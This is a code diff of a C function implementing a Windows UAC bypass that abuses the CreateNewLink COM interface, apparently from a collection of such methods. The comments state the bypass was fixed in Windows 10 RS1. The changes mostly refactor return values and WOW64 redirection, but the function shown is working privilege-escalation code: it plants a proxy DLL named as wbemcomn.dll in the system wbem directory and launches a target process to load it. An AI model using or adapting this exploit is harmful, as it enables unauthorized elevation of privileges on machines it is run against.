@@ -6,7 +6,7 @@
 *
 *  VERSION:     3.17
 *
-*  DATE:        17 Mar 2019
+*  DATE:        18 Mar 2019
 *
 *  rinn UAC bypass using CreateNewLink interface.
 *
@@ -59,15 +59,19 @@ BOOL ucmCreateNewLinkMethodCleanup(
 * In RS1 and afterwards this interface is not in consent whitelist (COMAutoApprovalList).
 * Because TH1 and TH2 are both EOL'ed at moment of discovery this method marked as fixed in RS1.
 *
-* Fixed in Windows 10 RS1 
+* Fixed in Windows 10 RS1
 *
 */
-BOOL ucmCreateNewLinkMethod(
+NTSTATUS ucmCreateNewLinkMethod(
     _In_ PVOID ProxyDll,
     _In_ DWORD ProxyDllSize
 )
 {
-    BOOL                bCond = FALSE;
+    NTSTATUS            MethodResult = STATUS_ACCESS_DENIED;
+    
+#ifndef _WIN64
+    NTSTATUS Status;
+#endif
 
     HRESULT             hr = E_UNEXPECTED, hr_init;
 
@@ -78,14 +82,12 @@ BOOL ucmCreateNewLinkMethod(
 
     WCHAR szDllPath[MAX_PATH * 2], szTargetPath[MAX_PATH * 2];
 
-#ifndef _WIN64
-    PVOID   OldValue = NULL;
-#endif
 
 #ifndef _WIN64
     if (g_ctx->IsWow64) {
-        if (!NT_SUCCESS(RtlWow64EnableFsRedirectionEx((PVOID)TRUE, &OldValue)))
-            return FALSE;
+        Status = supEnableDisableWow64Redirection(TRUE);
+        if (!NT_SUCCESS(Status))
+            return Status;
     }
 #endif
 
@@ -97,8 +99,10 @@ BOOL ucmCreateNewLinkMethod(
         _strcat(szDllPath, WBEMCOMN_DLL);
 
         l = _strlen(szDllPath);
-        if (l > MAX_PATH) //CreateNewLink parameters length limited to MAX_PATH
+        if (l > MAX_PATH) { //CreateNewLink parameters length limited to MAX_PATH
+            MethodResult = STATUS_DATA_ERROR;
             break;
+        }
 
         _strcpy(szTargetPath, g_ctx->szSystemDirectory);
         _strcat(szTargetPath, WBEM_DIR);
@@ -144,27 +148,25 @@ BOOL ucmCreateNewLinkMethod(
                 // Run target and wait.
                 //
                 if (supRunProcess(szTargetPath, NULL))
-                    hr = S_OK;
-                else
-                    hr = E_APPLICATION_ACTIVATION_TIMED_OUT;
+                    MethodResult = STATUS_SUCCESS;
 
             }
             DeleteFile(szDllPath); //remove temp file.
         }
 
-    } while (bCond);
+    } while (FALSE);
 
     if (CreateNewLink)
         CreateNewLink->lpVtbl->Release(CreateNewLink);
 
 #ifndef _WIN64
     if (g_ctx->IsWow64) {
-        RtlWow64EnableFsRedirectionEx(OldValue, &OldValue);
+        supEnableDisableWow64Redirection(FALSE);
     }
 #endif
 
     if (hr_init == S_OK)
         CoUninitialize();
 
-    return SUCCEEDED(hr);
+    return MethodResult;
 }
